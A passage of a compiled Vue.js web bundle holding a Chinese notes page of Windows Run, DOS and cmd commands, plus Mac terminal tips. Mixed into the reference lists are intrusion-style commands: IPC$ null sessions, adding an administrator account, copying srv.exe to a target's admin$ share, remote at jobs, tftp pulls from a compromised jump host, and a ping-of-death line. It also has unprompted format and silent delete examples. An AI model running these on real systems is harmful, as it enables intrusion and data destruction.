calc：启动计算器\n"),t("br"),t("br"),n._v("\n5. chkdsk.exe：Chkdsk磁盘检查（管理员身份运行命令提示符）\n"),t("br"),n._v("\n6. cleanmgr: 打开磁盘清理工具\n\n\n9. cmd.exe：CMD命令提示符\n10. 自动关机命令\n 　 Shutdown -s -t 600：表示600秒后自动关机\n 　 shutdown -a ：可取消定时关机\n 　 Shutdown -r -t 600：表示600秒后自动重启\n 　"),t("br"),t("br"),n._v("\n12. CompMgmtLauncher：计算机管理\n13. compmgmt.msc：计算机管理\n14. credwiz：备份或还原储存的用户名和密码\n"),t("br"),n._v("\n16. control：控制面版\n17. dcomcnfg：打开系统组件服务\n19. devmgmt.msc：设备管理器\n20. desk.cpl：屏幕分辨率\n21. dfrgui：优化驱动器   Windows 7→dfrg.msc：磁盘碎片整理程序\n22. dialer：电话拨号程序\n23. diskmgmt.msc：磁盘管理\n24. dvdplay：DVD播放器\n25. dxdiag：检查DirectX信息\n26. eudcedit：造字程序\n27. eventvwr：事件查看器\n28. explorer：打开资源管理器\n29. Firewall.cpl：Windows防火墙\n"),t("br"),n._v("\n31. fsmgmt.msc：共享文件夹管理器\n32. gpedit.msc：组策略\n33. hdwwiz.cpl：设备管理器\n34. inetcpl.cpl：Internet属性\n35. intl.cpl：区域\n36. iexpress：木马捆绑工具，系统自带\n37. joy.cpl：游戏控制器\n38. logoff：注销命令\n39. lusrmgr.msc：本地用户和组\n40. lpksetup：语言包安装/删除向导，安装向导会提示下载语言包\n41. lusrmgr.msc：本机用户和组\n42. main.cpl：鼠标属性\n43. mmsys.cpl：声音\n\n45. mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入mem.exe>d:a.txt 即可打开d盘查看a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。）\n"),t("br"),t("br"),t("br"),n._v("\n47. mmc：打开控制台\n48. mobsync：同步命令\n\n 50. Msconfig.exe：系统配置实用程序\n51. msdt：微软支持诊断工具\n52. msinfo32：系统信息\n53. mspaint：画图\n54. Msra：Windows远程协助\n55. mstsc：远程桌面连接\n56. NAPCLCFG.MSC：客户端配置\n57. ncpa.cpl：网络连接\n58. narrator：屏幕“讲述人”\n59. Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项\n60. netstat : an(TC)命令检查接口\n61. notepad：打开记事本\n62. Nslookup：IP地址侦测器\n63. odbcad32：ODBC数据源管理器\n"),t("br"),n._v("\n64. OptionalFeatures：打开“打开或关闭Windows功能”对话框\n"),t("br"),t("br"),n._v("\n65. osk：打开屏幕键盘\n66. perfmon.msc：计算机性能监测器\n67. perfmon：计算机性能监测器\n68. PowerShell：提供强大远程处理能力\n69. printmanagement.msc：打印管理\n70. powercfg.cpl：电源选项\n71. psr：问题步骤记录器\n72. Rasphone：网络连接\n73. Recdisc：创建系统修复光盘\n74. Resmon：资源监视器\n75. Rstrui：系统还原\n76. regedit.exe：注册表\n77. regedt32：注册表编辑器\n78. rsop.msc：组策略结果集\n79. sdclt：备份状态与配置，就是查看系统是否已备份\n80. secpol.msc：本地安全策略\n81. services.msc：本地服务设置\n82. sfc /scannow：扫描错误并复原/windows文件保护\n83. sfc.exe：系统文件检查器\n84. shrpubw：创建共享文件夹\n85. sigverif：文件签名验证程序\n86. slui：Windows激活，查看系统激活信息\n87. slmgr.vbs -dlv ：显示详细的许可证信息\n 　 slmgr.vbs -dli ：显示许可证信息\n 　 slmgr.vbs -xpr ：当前许可证截止日期\n 　 slmgr.vbs -dti ：显示安装ID 以进行脱机激\n 　 slmgr.vbs -ipk ：(Product Key)安装产品密钥\n 　 slmgr.vbs -ato ：激活Windows\n　 slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击）\n 　 slmgr.vbs -ilc ：(License file)安装许可证\n 　 slmgr.vbs -upk ：卸载产品密钥\n 　 slmgr.vbs -skms ：(name[ort] )批量授权\n88. snippingtool：截图工具，支持无规则截图\n89. soundrecorder：录音机，没有录音时间的限制\n90. StikyNot：便笺\n91. sysdm.cpl：系统属性\n92. sysedit：系统配置编辑器\n93. syskey：系统加密，一旦加密就不能解开，保护系统的双重密码\n94. taskmgr：任务管理器（旧版）\n95. TM任务管理器（新版）\n96. taskschd.msc：任务计划程序\n97. timedate.cpl：日期和时间\n98. UserAccountControlSettings用户账户控制设置\n99. utilman：辅助工具管理器\n100. wf.msc：高级安全Windows防火墙\n101. WFS：Windows传真和扫描\n102. wiaacmgr：扫描仪和照相机向导\n103. winver：关于Windows\n 104. wmimgmt.msc：打开windows管理体系结构(WMI)\n 105. write：写字板\n106. wscui.cpl：操作中心\n107. wscript：windows脚本宿主设置\n108. wuapp：Windows更新"),t("br"),t("br"),n._v("\n1. gpedit.msc-----组策略"),t("br"),n._v("\n\n2. sndrec32-------录音机"),t("br"),n._v("\n\n3. Nslookup-------IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。"),t("br"),n._v("\n\n4. explorer-------打开资源管理器\n\n5. logoff---------注销命令"),t("br"),n._v("\n\n6. shutdown-------60秒倒计时关机命令"),t("br"),n._v("\n\n7. lusrmgr.msc----本机用户和组"),t("br"),n._v("\n\n8. services.msc---本地服务设置"),t("br"),n._v("\n\n9. oobe/msoobe /a----检查XP是否激活"),t("br"),n._v("\n\n10. notepad--------打开记事本\n\n\n"),t("br"),t("br"),t("br"),t("br"),n._v("\n11. cleanmgr-------垃圾整理"),t("br"),n._v("\n\n12. net start messenger----开始信使服务"),t("br"),n._v("\n\n13. compmgmt.msc---计算机管理"),t("br"),n._v("\n\n14. net stop messenger-----停止信使服务"),t("br"),n._v("\n\n15. conf-----------启动netmeeting"),t("br"),n._v("\n\n16. dvdplay--------DVD播放器"),t("br"),n._v("\n\n17. charmap--------启动字符映射表"),t("br"),n._v("\n\n18. diskmgmt.msc---磁盘管理实用程序"),t("br"),n._v("\n\n19. calc-----------启动计算器"),t("br"),n._v("\n\n20. dfrg.msc-------磁盘碎片整理程序"),t("br"),n._v("\n\n21. chkdsk.exe-----Chkdsk磁盘检查"),t("br"),n._v("\n\n22. devmgmt.msc--- 设备管理器\n\n23. regsvr32 /u *.dll----停止dll文件运行"),t("br"),n._v("\n\n24. drwtsn32------ 系统医生"),t("br"),n._v("\n\n25. rononce -p----15秒关机"),t("br"),n._v("\n\n26. dxdiag---------检查DirectX信息"),t("br"),n._v("\n\n27. regedt32-------注册表编辑器\n\n28. Msconfig.exe---系统配置实用程序"),t("br"),n._v("\n\n29. rsop.msc-------组策略结果集"),t("br"),n._v("\n\n30. mem.exe--------显示内存使用情况"),t("br"),n._v("\n\n31. regedit.exe----注册表"),t("br"),n._v("\n\n32. winchat--------XP自带局域网聊天"),t("br"),n._v("\n\n33. progman--------程序管理器"),t("br"),n._v("\n\n34. winmsd---------系统信息"),t("br"),n._v("\n\n35. perfmon.msc----计算机性能监测程序"),t("br"),n._v("\n\n36. winver---------检查Windows版本"),t("br"),n._v("\n\n37. sfc /scannow-----扫描错误并复原"),t("br"),n._v("\n\n38. taskmgr-----任务管理器（2000/xp/2003"),t("br"),n._v("\n\n39. winver---------检查Windows版本"),t("br"),n._v("\n\n40. wmimgmt.msc----打开windows管理体系结构(WMI)"),t("br"),n._v("\n\n41. wupdmgr--------windows更新程序"),t("br"),n._v("\n\n42. wscript--------windows脚本宿主设置"),t("br"),n._v("\n\n43. write----------写字板"),t("br"),n._v("\n\n44. winmsd---------系统信息"),t("br"),n._v("\n\n45. wiaacmgr-------扫描仪和照相机向导"),t("br"),n._v("\n\n46. winchat--------XP自带局域网聊天"),t("br"),n._v("\n\n47. mem.exe--------显示内存使用情况"),t("br"),n._v("\n\n48. Msconfig.exe---系统配置实用程序"),t("br"),n._v("\n\n49. mplayer2-------简易widnows media player"),t("br"),n._v("\n\n50. mspaint--------画图板"),t("br"),n._v("\n\n51. mstsc----------远程桌面连接"),t("br"),n._v("\n\n52. mplayer2-------媒体播放机"),t("br"),n._v("\n\n53. magnify--------放大镜实用程序"),t("br"),n._v("\n\n54. mmc------------打开控制台"),t("br"),n._v("\n\n55. mobsync--------同步命令"),t("br"),n._v("\n\n56. dxdiag---------检查DirectX信息"),t("br"),n._v("\n\n57. iexpress-------木马捆绑工具，系统自带 58. fsmgmt.msc-----共享文件夹管理器"),t("br"),n._v("\n\n59. utilman--------辅助工具管理器"),t("br"),n._v("\n\n60. diskmgmt.msc---磁盘管理实用程序"),t("br"),n._v("\n\n61. dcomcnfg-------打开系统组件服务"),t("br"),n._v("\n\n62. ddeshare-------打开DDE共享设置"),t("br"),n._v("\n\n110. osk------------打开屏幕键盘\n\n111. odbcad32-------ODBC数据源管理器"),t("br"),n._v("\n\n112. oobe/msoobe /a----检查XP是否激活 114. logoff---------注销命令"),t("br"),n._v("\n\n66. notepad--------打开记事本"),t("br"),n._v("\n\n67. nslookup-------网络管理的工具向导"),t("br"),n._v("\n\n68. ntbackup-------系统备份和还原"),t("br"),n._v("\n\n69. narrator-------屏幕“讲述人”"),t("br"),n._v("\n\n70. ntmsmgr.msc----移动存储管理器"),t("br"),n._v("\n\n71. ntmsoprq.msc---移动存储管理员操作请求"),t("br"),n._v("\n\n72. netstat -an----(TC)命令检查接口"),t("br"),n._v("\n\n73. syncapp--------创建一个公文包"),t("br"),n._v("\n\n74. sysedit--------系统配置编辑器"),t("br"),n._v("\n\n75. sigverif-------文件签名验证程序"),t("br"),n._v("\n\n76. ciadv.msc------索引服务程序"),t("br"),n._v("\n\n77. shrpubw--------创建共享文件夹"),t("br"),n._v("\n\n78. secpol.msc-----本地安全策略"),t("br"),n._v("\n\n79. syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码"),t("br"),n._v("\n\n80. services.msc---本地服务设置"),t("br"),n._v("\n\n81. Sndvol32-------音量控制程序"),t("br"),n._v("\n\n82. sfc.exe--------系统文件检查器"),t("br"),n._v("\n\n83. sfc /scannow---windows文件保护"),t("br"),n._v("\n\n84. ciadv.msc------索引服务程序"),t("br"),n._v("\n\n85. tourstart------xp简介（安装完成后出现的漫游xp程序）"),t("br"),n._v("\n\n86. taskmgr--------任务管理器"),t("br"),n._v("\n\n87. eventvwr-------事件查看器"),t("br"),n._v("\n\n88. eudcedit-------造字程序"),t("br"),n._v("\n\n89. compmgmt.msc---计算机管理"),t("br"),n._v("\n\n90. packager-------对象包装程序"),t("br"),n._v("\n\n91. perfmon.msc----计算机性能监测程序"),t("br"),n._v("\n\n92. charmap--------启动字符映射表"),t("br"),n._v("\n\n93. cliconfg-------SQL SERVER 客户端网络实用程序"),t("br"),n._v("\n\n94. Clipbrd--------剪贴板查看器"),t("br"),n._v("\n\n95. conf-----------启动netmeeting"),t("br"),n._v("\n\n96. certmgr.msc----证书管理实用程序"),t("br"),n._v("\n\n97. regsvr32 /u *.dll----停止dll文件运行"),t("br"),n._v("\n\n98. regsvr32 /u zipfldr.dll------取消ZIP支持"),t("br"),n._v("\n\n99. cmd.exe--------CMD命令提示符"),t("br"),n._v("\n\n100. chkdsk.exe-----Chkdsk磁盘检查"),t("br"),n._v("\n\n1.磁盘操作，fdisk 隐含 参数 /mbr 重建主引导记录fdisk /mbr 重建主引导记录fdisk 在DOS7.0以后增加了/cmbr参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）format 参数： /q 快速格式化 /u 不可恢复 /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest"),t("br"),n._v("\n2.目录操作DIR [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR format.exe /s查找该盘的format.exe文件并报告位置MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建HELLOWORLD目录\n　　CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的AA目录,cd .. 进入上一个文件夹cd \\返回根目录;cd c:\\windows 进入c:\\windows文件夹RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除HELLOWORLD目录"),t("br"),n._v("\n3.文件操作删除目录及其文件： rmdir [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\\qqdownload/s 删除C盘的qqdownload目录。del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s 删除该目录及其下的所有内容 /q 删除前不确认del c:\\del /s /q 自动删除c盘的del目录。copy [源文件或目录] [目标目录] 复制文件 copy d:\\pwin98\\*.* c:\\presetup 将d盘的pwin98的所有文件复制到c盘的presetup下。attrib [参数][源文件或目录] 文件属性操作命令，attrib命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r -s io.sys 执行这一命令后，将把DOS系统文件io.sys文件的只读、隐藏、系统属性去掉，这时将可以直接通过dir命令看到io.sys文件。attrib +h +r +s autoexec.bat将为自动批处理文件增加以上属性。"),t("br"),n._v("\n4.内存操作debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址1] [地址2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01[return] 01[return] q[return] DOS下通过写70h/71h PORT改变BIOS密码在CMOS中存放的对应位置的值,用以清除AWARD BIOS密码.debug 还可以破解硬盘保护卡等,但只可以在纯DOS下用。"),t("br"),n._v("\n5.分区操作给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。PQ和Acronis Disk Director这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP系统的话你用PQ，WIN7系统的话用Acronis Disk Director 操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。"),t("br"),n._v('\nnet use ipipc$ " " /user:" " 建立IPC空链接'),t("br"),n._v('\n\nnet use ipipc$ "密码" /user:"用户名" 建立IPC非空链接'),t("br"),n._v('\n\nnet use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:'),t("br"),n._v("\n\nnet use h: ipc$ 登陆后映射对方C：到本地为H:"),t("br"),n._v("\n\nnet use ipipc$ /del 删除IPC链接"),t("br"),n._v("\n\nnet use h: /del 删除映射对方到本地的为H:的映射"),t("br"),n._v("\n\nnet user 用户名　密码　/add 建立用户"),t("br"),n._v("\n\nnet user guest /active:yes 激活guest用户"),t("br"),n._v("\n\nnet user 查看有哪些用户"),t("br"),n._v("\n\nnet user 帐户名 查看帐户的属性"),t("br"),n._v("\n\nnet localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限"),t("br"),n._v("\n\nnet start 查看开启了哪些服务"),t("br"),n._v("\n\nnet start 服务名　开启服务；(如:net start telnet， net start schedule)"),t("br"),n._v("\n\nnet stop 服务名 停止某服务"),t("br"),n._v("\n\nnet time 目标ip 查看对方时间"),t("br"),n._v("\n\nnet time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息"),t("br"),n._v("\n\nnet view 查看本地局域网内开启了哪些共享"),t("br"),n._v("\n\nnet view ip 查看对方局域网内开启了哪些共享"),t("br"),n._v("\n\nnet config 显示系统网络设置"),t("br"),n._v("\n\nnet logoff 断开连接的共享"),t("br"),n._v("\n\nnet pause 服务名 暂停某服务"),t("br"),n._v('\n\nnet send ip "文本信息" 向对方发信息'),t("br"),n._v("\n\nnet ver 局域网内正在使用的网络连接类型和信息"),t("br"),n._v("\n\nnet share 查看本地开启的共享"),t("br"),n._v("\n\nnet share ipc$ 开启ipc$共享"),t("br"),n._v("\n\nnet share ipc$ /del 删除ipc$共享"),t("br"),n._v("\n\nnet share c$ /del 删除C：共享"),t("br"),n._v("\n\nnet user guest 12345 用guest用户登陆后用将密码改为12345"),t("br"),n._v("\n\nnet password 密码 更改系统登陆密码"),t("br"),n._v("\n\nnetstat -a 查看开启了哪些端口,常用netstat -an"),t("br"),n._v("\n\nnetstat -n 查看端口的网络连接情况，常用netstat -an"),t("br"),n._v("\n\nnetstat -v 查看正在进行的工作"),t("br"),n._v("\n\nnetstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况"),t("br"),n._v("\n\nnetstat -s 查看正在使用的所有协议使用情况"),t("br"),n._v("\n\nnbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名"),t("br"),n._v("\n\ntracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。"),t("br"),n._v("\n\nping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。"),t("br"),n._v("\n\nping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)"),t("br"),n._v("\n\nipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息"),t("br"),n._v("\n\ntlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)"),t("br"),n._v("\n\nkill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)"),t("br"),n._v("\n\ndel -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，"),t("br"),n._v("\n/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件"),t("br"),n._v("\n\ndel /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）"),t("br"),n._v("\n\nmove 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖"),t("br"),n._v('\n\nfc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令'),t("br"),n._v("\n\nat id号 开启已注册的某个计划任务"),t("br"),n._v("\n\nat /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止"),t("br"),n._v("\n\nat id号 /delete 停止某个已注册的计划任务"),t("br"),n._v("\n\nat 查看所有的计划任务"),t("br"),n._v("\n\nat ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机"),t("br"),n._v("\n\nfinger username @host 查看最近有哪些用户登陆"),t("br"),n._v("\n\ntelnet ip 端口 远和登陆服务器,默认端口为23"),t("br"),n._v("\n\nopen ip 连接到IP（属telnet登陆后的命令）"),t("br"),n._v("\n\ntelnet 在本机上直接键入telnet 将进入本机的telnet"),t("br"),n._v("\n\ncopy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件"),t("br"),n._v("\n\ncopy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下"),t("br"),n._v("\n\ncopy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件"),t("br"),n._v("\n\ncopy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C："),t("br"),n._v("\n\nxcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件"),t("br"),n._v("\n\n用参数/e才可连目录下的子目录一起复制到目标地址下。"),t("br"),n._v("\n\ntftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，"),t("br"),n._v("\n将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送"),t("br"),n._v("\n\ntftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机"),t("br"),n._v("\n\nftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)"),t("br"),n._v("\n\nroute print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface"),t("br"),n._v("\n\narp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息"),t("br"),n._v("\n\nstart 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令"),t("br"),n._v("\n\nmem 查看cpu使用情况"),t("br"),n._v("\n\nattrib 文件名(目录名) 查看某文件（目录）的属性"),t("br"),n._v("\n\nattrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性"),t("br"),n._v("\n\ndir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间"),t("br"),n._v("\n\ndate /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间"),t("br"),n._v("\n\nset 指定环境变量名称=要指派给变量的字符 设置环境变量"),t("br"),n._v("\n\nset 显示当前所有的环境变量"),t("br"),n._v("\n\nset p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量"),t("br"),n._v("\n\npause 暂停批处理程序，并显示出：请按任意键继续...."),t("br"),n._v("\n\nif 在批处理程序中执行条件处理（更多说明见if命令及变量）"),t("br"),n._v("\n\ngoto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）"),t("br"),n._v("\n\ncall 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）"),t("br"),n._v("\n\nfor 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）"),t("br"),n._v("\n\necho on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置"),t("br"),n._v("\n\necho 信息 在屏幕上显示出信息"),t("br"),n._v('\n\necho 信息 >> pass.txt 将"信息"保存到pass.txt文件中'),t("br"),n._v('\n\nfindstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello'),t("br"),n._v("\n\nfind 文件名 查找某文件"),t("br"),n._v("\n\ntitle 标题名字 更改CMD窗口标题名字"),t("br"),n._v("\n\ncolor 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白"),t("br"),n._v("\n\nprompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )"),t("br"),n._v("\n\nver 在DOS窗口下显示版本信息\n\nwinver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）"),t("br"),n._v("\n\nformat 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS"),t("br"),n._v("\n\nmd　目录名 创建目录"),t("br"),n._v("\n\nreplace 源文件　要替换文件的目录 替换文件"),t("br"),n._v("\n\nren 原文件名　新文件名 重命名文件名"),t("br"),n._v("\n\ntree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称"),t("br"),n._v("\n\ntype 文件名 显示文本文件的内容"),t("br"),n._v("\n\nmore 文件名 逐屏显示输出文件"),t("br"),n._v("\n\ndoskey 要锁定的命令=字符"),t("br"),n._v("\n\ndoskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir="),t("br"),n._v("\n\ntaskmgr 调出任务管理器"),t("br"),n._v("\n\nchkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误"),t("br"),n._v("\n\ntlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口"),t("br"),n._v("\n\nexit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe"),t("br"),n._v("\n\npath 路径可执行文件的文件名 为可执行文件设置一个路径。"),t("br"),n._v("\n\ncmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?"),t("br"),n._v("\n\nregedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；"),t("br"),n._v("\n\nregedit /e 注册表文件名 导出注册表"),t("br"),n._v("\n\ncacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。"),t("br"),n._v("\n参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；"),t("br"),n._v("\n/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。"),t("br"),n._v("\n\ncacls 文件名 查看文件的访问用户权限列表"),t("br"),n._v("\n\nREM 文本内容 在批处理文件中添加注解"),t("br"),n._v("\n\nnetsh 查看或更改本地网络配置情况"),t("br"),t("br")])])}],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"789b5eac",null),d=m.exports,g=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},b=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("    dir  目录 \n    cls 清屏\n    资源管理器 内  地址栏  直接输入 cmd 定位当前文件夹 目录 \n")])])}],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"0d0bc40a",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"90f215c0",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"e4da473e",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"639ec3a2",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"39aaaae3",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"0fb69224",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"347b0d36",null),rn=nn.exports,tn=t("1b62"),en={mixins:[tn["a"]],components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"CMD命令",value:"m1"}]}}},an=en,sn=Object(u["a"])(an,i,s,!1,null,"b7c93b9a",null),on=sn.exports,ln=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},cn=[],pn=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},un=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("        在mac下npm install的错误处理\nsudo －s      权限问题\n\ncommand+shift+G，前往文件夹\ncommand+shift+. 显示隐藏文件\nopen ~/.bash_profile .  打开文件\nsource ~/.bash_profile   立即生效\nPATH=$PATH:~/.composer/vendor/bin  添加 path\n\n\nmac 终端 一些命令\n\nsudo －s      权限问题\ncd downloads\nmkdir  生成文件夹\ncd    进入 \ncd ../server\nls    列出当前文件夹下的文件夹\ntouch js/class/test.js   创建test 文件，并 初始化\ntouch views/index.ejs  初始化创建 入口 模板文件\n\nclear   清空 \n    ")]),t("pre",[n._v("        mac退出bash-32\n        https://blog.csdn.net/qingtian12138/article/details/68065272\n\n今天准备学Scala，配环境的时候，不知道怎么弄得，晕晕乎乎把终端root了，打开就显示bash-32，不显示当前工作路径了，输入exit也没用，打开还是bash, 搜了一下午解决方案，都不好使，咨询了大神，终于弄好了，下面记录下来。\n出现这种情况的原因是进了shell环境，我们首先检查终端是不是一打开就默认进shell环境，\n左上角打开终端的偏好设置，将shell的打开方式那一栏选命令\n\n\n然后重启终端，看看问题是不是解决了，如果还是不行，接着下一步\n输入vi ~/.bash_profile\n打开配置文件，输入i进入编辑页面，在最后一行加入\nexport PS1='[\\u@\\h \\w]\\$'\n\n然后按Esc退出编辑模式，输入大写ZZ保存退出。\n然后执行\nsource ~/.bash_profile\n重启终端，问题解决！\n\n\n其实呢，加进去的那一行是bash可识别的转义序列\nbash可识别的转义序列有下面这些：\n\\u 用户名\n\\h 主机名第一部分\n\\H 主机名全称\n\\w 当前工作目录（如 “/home/username/mywork”）\n\\W 当前工作目录的“基名 (basename)”（如 “mywork”)\n\\t 24 小时制时间\n\\T 12 小时制时间\n\\@ 带有 am/pm 的 12 小时制时间\n\\d “Sat Dec 18″ 格式的日期\n\\s shell 的名称（如 “bash”)\n\\v bash 的版本（如 2.04）\n\\V Bash 版本（包括补丁级别）\n\\n 换行符\n\\r 回车符\n\\\\ 反斜杠\n\\a ASCII 响铃字符（也可以键入 07）\n\\e ASCII 转义字符（也可以键入 